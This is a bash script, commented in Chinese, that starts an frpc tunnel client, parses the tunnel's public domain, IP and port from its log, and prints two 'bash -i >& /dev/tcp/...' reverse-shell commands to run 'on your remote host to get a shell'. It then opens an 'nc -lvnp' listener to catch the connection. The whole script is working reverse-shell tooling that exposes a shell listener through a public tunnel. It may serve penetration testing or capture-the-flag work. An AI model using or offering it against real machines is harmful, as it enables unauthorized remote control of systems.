#!/bin/bash

# 如果未提供环境变量，退出
if [ -z "$FRPC_KEY_ID" ]; then
    echo "Error: FRPC_KEY_ID environment variable is not set"
    echo "Use export FRPC_KEY_ID=key:id to create the FRPC_KEY_ID environment variable."
    exit 1
fi

# 检查当前目录是否存在 frpc 可执行文件
if [ ! -x "./frpc" ]; then
    echo "Frpc kernel not detected, please download Linux version according to https://doc.natfrp.com/frpc/usage.html and rename it frpc and put it in the same directory as this script."
    exit 1
fi

LOGFILE="frpc_start.log"

# 启动 frpc
> "$LOGFILE"
nohup ./frpc -f $FRPC_KEY_ID &>> "$LOGFILE" &
echo "Waiting for frpc to start..." | tee -a "$LOGFILE"
sleep 4

# 检查日志文件内容
logFile="frpc_start.log"

if [ -s "$logFile" ]; then
    echo "FRPC log has been updated."
else
    echo "FRPC log is still empty."
fi

# 从日志文件中读取内容
logContent=$(cat "$logFile")


# 解析隧道信息
tunnelInfoPattern="用 \[(.+?):([0-9]+)\] "
ipInfoPattern="IP \S+: \[(.+?):([0-9]+)\]"

if [[ $logContent =~ $tunnelInfoPattern ]]; then
    tunnelDomain="${BASH_REMATCH[1]}"
    tunnelPort="${BASH_REMATCH[2]}"
    echo "[OK] Tunnel Domain: $tunnelDomain, Tunnel Port: $tunnelPort"
else
    echo "Error: Tunnel information not found."
fi

if [[ $logContent =~ $ipInfoPattern ]]; then
    tunnelIP="${BASH_REMATCH[1]}"
    echo "[OK] Tunnel IP: $tunnelIP, Tunnel Port: $tunnelPort"
else
    echo "Error: IP information not found."
fi
# 解析本地端口
localPortPattern=" tcp -> 127\.0\.0\.1:([0-9]+)\]"

if [[ $logContent =~ $localPortPattern ]]; then
    localPort="${BASH_REMATCH[1]}"
    echo "Local Port: $localPort"
else
    echo "Error: Local port not found."
fi

# 输出连接指令
if [[ -n "$tunnelDomain" && -n "$tunnelIP" && -n "$tunnelPort" ]]; then
    bashCommand1="bash -i >& /dev/tcp/$tunnelDomain/$tunnelPort 0>&1"
    bashCommand2="bash -i >& /dev/tcp/$tunnelIP/$tunnelPort 0>&1"
    echo "[OK] Use either of these commands on your remote host to get a shell:"
    echo $bashCommand1
    echo $bashCommand2
fi

# 启动 nc 监听本地端口
if [[ -n "$localPort" ]]; then
    nc -lvnp $localPort
fi
